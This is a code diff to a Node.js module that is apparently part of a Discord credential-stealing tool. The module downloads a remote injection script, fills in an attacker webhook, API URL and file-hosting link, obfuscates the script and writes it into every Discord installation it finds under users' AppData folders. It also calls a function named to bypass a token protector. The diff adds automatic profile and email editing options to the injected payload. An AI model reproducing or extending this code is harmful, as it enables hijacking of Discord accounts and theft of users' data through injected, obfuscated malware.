@@ -13,8 +13,15 @@ const axios         = require('axios');
 const path          = require('path');
 const fs            = require('fs');
 
-async function injectDiscord(dir, injectionUrl, webhook) {
+async function injectDiscord(dir, injectionUrl, webhook, api) {
     try {
+        const CONFIG_INJECT = {
+            API: api,
+            auto_user_profile_edit: 'true',
+            auto_email_update: 'true',
+            gofile_download_link: 'https://gofile.io', // Perhaps I'll add something better when there are more stars
+        };
+
         const files = await fsPromises.readdir(dir, { withFileTypes: true });
         const appDirs = files
             .filter(file => file.isDirectory() && file.name.startsWith('app-'))
@@ -42,7 +49,12 @@ async function injectDiscord(dir, injectionUrl, webhook) {
                 const response = await axios.get(injectionUrl);
                 const injection = response.data;
 
-                const srcInjection = injection.replace("%WEB" + "HOOK%", webhook);
+                const srcInjection = injection
+                    .replace("%WEBHOOK_URL%", webhook)
+                    .replace("%API_URL%", CONFIG_INJECT.API)
+                    .replace("%AUTO_USER_PROFILE_EDIT%", CONFIG_INJECT.auto_user_profile_edit)
+                    .replace("%AUTO_EMAIL_UPDATE%", CONFIG_INJECT.auto_email_update)
+                    .replace("%GOFILE_DOWNLOAD_LINK%", CONFIG_INJECT.gofile_download_link);
                 
                 const applyObfInjection = await jsConfuser.obfuscate(srcInjection, {
                     target: "node",
@@ -159,7 +171,7 @@ function bypassTokenProtector(user) {
     }
 }
 
-module.exports = async (injectionUrl, webhook) => {
+module.exports = async (injectionUrl, webhook, api) => {
     try {
         const users = await getUsers();
         for (const user of users) {
@@ -172,7 +184,7 @@ module.exports = async (injectionUrl, webhook) => {
                 path.join(user, 'AppData', 'Local', 'discorddevelopment')
             ];
             for (const dir of directories) {
-                await injectDiscord(dir, injectionUrl, webhook);
+                await injectDiscord(dir, injectionUrl, webhook, api);
             }
         }
     } catch (error) {
